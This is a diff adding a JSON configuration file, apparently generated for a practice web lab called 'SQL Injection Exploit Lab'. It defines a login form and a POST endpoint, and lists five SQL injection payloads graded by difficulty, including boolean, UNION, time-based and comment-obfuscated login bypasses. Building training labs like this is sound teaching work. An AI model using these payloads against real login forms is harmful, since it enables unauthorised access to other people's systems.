@@ -1,0 +1,56 @@
+{
+  "timestamp": "2026-02-13T13:47:56.901214",
+  "vulnerability_id": "sql_injection",
+  "generated_html_structure": {
+    "title": "SQL Injection Exploit Lab",
+    "icon": "\ud83d\udc89",
+    "input_fields": [
+      {
+        "name": "username",
+        "label": "Username",
+        "type": "text",
+        "placeholder": "admin' OR '1'='1' --"
+      },
+      {
+        "name": "password",
+        "label": "Password",
+        "type": "password",
+        "placeholder": "anything"
+      }
+    ],
+    "payload_examples": [
+      {
+        "name": "Auth Bypass",
+        "payload": "admin' --",
+        "difficulty": "easy"
+      },
+      {
+        "name": "Boolean Logic",
+        "payload": "admin' OR '1'='1' --",
+        "difficulty": "easy"
+      },
+      {
+        "name": "UNION Attack",
+        "payload": "admin' UNION SELECT NULL--",
+        "difficulty": "medium"
+      },
+      {
+        "name": "Time-Based Blind",
+        "payload": "admin' AND SLEEP(5)--",
+        "difficulty": "hard"
+      },
+      {
+        "name": "Advanced Bypass",
+        "payload": "admin'/**/OR/**/'1'='1'/**/--",
+        "difficulty": "expert"
+      }
+    ],
+    "endpoint": "/api/v1/vulnerabilities/sql-injection/login",
+    "method": "POST"
+  },
+  "frontend_elements": {
+    "has_input_fields": true,
+    "has_examples": true,
+    "has_endpoint": true
+  }
+}
